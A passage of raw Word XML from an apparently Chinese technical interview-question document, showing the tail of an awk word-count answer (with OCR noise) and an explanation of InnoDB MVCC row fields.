        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>方法二：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="500"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">(1) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>awk ' BEGIN {RS=" [,.:;/!?]"} {for ：i=l; i&lt;=NF; i++) array [$i] ++;}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>END {for (i in array) print i, array [i] }</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>J</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> file</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="88" w:name="bookmark94"/>
      <w:bookmarkStart w:id="89" w:name="bookmark95"/>
      <w:bookmarkStart w:id="90" w:name="bookmark96"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>16.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>请解释</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Mysql MVCC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>实现原理</w:t>
      </w:r>
      <w:bookmarkEnd w:id="88"/>
      <w:bookmarkEnd w:id="89"/>
      <w:bookmarkEnd w:id="90"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>innodb MVCC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>主要是为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Repeatable-Re ad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>事务隔离级别做的。在此隔离级别</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>下，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">A、B </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>客户端所示的数据相互隔离，互相更新不可见</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>了解</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>innodb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的行结构、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Read-View</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的结构对于理解</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>innodb mvcc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">的实现由重要意义 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>innodb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>存储的最基本</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>row</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中包含一些额外的存储信息</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>DATA_TRX_ID, DATA_ROLL_PTR, DB_ROW_ID, DELETE BIT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>字节的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>DATA_TRX_ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>标记了最新更新这条行记录的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>transaction id,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>每处理一个事</w:t>
      </w:r>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:pBdr>
          <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>务，其值自动+1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>7字节的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>DATA_R0LL_PTR</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>指向当前记录项的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>rollback segment</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>undo log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>记录，找之 前版本的数据就是通过这个指针</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>6字节的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>DB_ROW_ID,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>当由</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>innodb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>自动产生聚集索引时，聚集索引包括这个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">DB_ROW_ID </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的值，否则聚集索引中不包括这</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>个值.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>，这个用于索引当中</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>DELETE BIT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>位用于标识该记录是否被删除，这里的不是真正的删除数据，而是标志出 来的删除。真正意义的删除是在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>commit</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>时候.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:line="1" w:lineRule="exact"/>
        <w:sectPr>
          <w:headerReference r:id="rId11" w:type="default"/>
          <w:headerReference r:id="rId12" w:type="even"/>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1357" w:right="1781" w:bottom="1413" w:left="1778" w:header="0" w:footer="3" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:anchor distT="279400" distB="0" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>1610360</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>279400</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4743450" cy="428625"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:wrapTopAndBottom/>
            <wp:docPr id="36" name="Shape 36"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="36" name="Shape 36"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId35"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4743450" cy="428625"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="5" w:after="5" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:line="1" w:lineRule="exact"/>
        <w:sectPr>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1490" w:right="0" w:bottom="1580" w:left="0" w:header="0" w:footer="3" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:line="1" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>1591310</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>12700</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4810125" cy="2781300"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:wrapTight wrapText="left">
              <wp:wrapPolygon>
                <wp:start x="0" y="0"/>
                <wp:lineTo x="21600" y="0"/>
                <wp:lineTo x="21600" y="15312"/>
                <wp:lineTo x="20873" y="15312"/>
                <wp:lineTo x="20873" y="18419"/>
                <wp:lineTo x="21600" y="18419"/>
                <wp:lineTo x="21600" y="21600"/>
                <wp:lineTo x="3293" y="21600"/>
                <wp:lineTo x="3293" y="20195"/>
                <wp:lineTo x="0" y="20195"/>
                <wp:lineTo x="0" y="0"/>
              </wp:wrapPolygon>
            </wp:wrapTight>
            <wp:docPr id="38" name="Shape 38"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="38" name="Shape 38"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId36"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4810125" cy="2781300"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>5115560</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>1971675</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="542925" cy="371475"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:wrapTopAndBottom/>
            <wp:docPr id="40" name="Shape 40"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="40" name="Shape 40"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId37"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="542925" cy="371475"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
